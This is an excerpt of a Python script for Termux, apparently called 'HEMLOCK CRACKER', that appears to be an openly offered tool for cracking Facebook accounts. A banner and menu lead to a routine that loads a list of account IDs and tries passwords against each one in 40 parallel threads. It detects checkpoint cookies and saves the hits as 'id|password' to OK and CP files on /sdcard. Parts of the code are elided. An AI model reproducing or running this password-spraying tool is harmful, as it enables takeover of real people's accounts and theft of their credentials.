...
`------'`------'`------'`------'`------'`------'`------'
  {asu}DEMONIC{P}     
{asu}---------------------------------------------------{P}
 Author    {M}:\033[1;37m DEMONIC
 Github    {M}:\033[1;37m evandipro2004
 Facebook  {M}:\033[1;37m ISFAQ EVAN DIPRO 
 Tool Name {M}:{N} HEMLOCK CRACKER{P}
 OWNER   {M}:\033[1;37m {H}E{P}|{H}V{P}|{H}A{P}|{H}N{P}
 Status    {M}:\033[1;32m FREE{P}
 Version   {M}: {H}1.0\033[1;37m
{asu}---------------------------------------------------{P}""")
led = f"""{asu}---------------------------------------------------"""
def login():
    try:
...
def menu(my_name,my_id):
    ...
    print(f'{P}YOUR LOCATION {M}:{H} {crazy_nilSu}');print(f'{P}YOUR Name  {M}:{H} {my_name}');print(led)
    ...
    print(f'{P}[{asu}5{P}] TELEGRAM CHANNEL')
    ...
    if crazy_nil in ['1']:
        ...
        os.system('xdg-open https://t.me/termux_command_store');time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');back()
    elif crazy_nil in ['6']:
        os.system('xdg-open https://github.com/Hacker1414');time.sleep(2);back()
    elif crazy_nil in ['4']:
        dupcutter()
    elif crazy_nil in ['0']:
...
def dupcutter():
    os.system('clear');banner();print(f' {P}Example   {M}:{H} /sdcard/demonic.txt');print(led)
    Error = input(f" {N}File Name {M}:{H} ");print(led);print(f' {P}Example   {M}:{H} /sdcard/hemlock.txt');print(led)
    ...
    with tred(max_workers=40) as pool:
        for yuzong in id2:
            ...
            if 'mobile' in method:
                ...
                pool.submit(crack,idf,pwv)
    print(led);print(f'{N} Hello, YOU ARE DONE.');print(f' {P}Total ok : {H}'+len(ok));print(f' {P}Total cp : {K}'+len(cp));print(led)
...
def crack(idf,pwv):
    ...
    #fff = '%'
    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRabbi\033[1;97m] {P}[{B}{(loop)}{P}]{H} OK>{(ok)} {K}CP>{(cp)}\r')
    sys.stdout.flush()
    ses = requests.Session()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[1;93m[Rabbi-CP] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/Rabbi-CP.txt', 'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
                ...
                print('\x1b[1;92m[Rabbi-OK] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/Rabbi-OK.txt', 'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
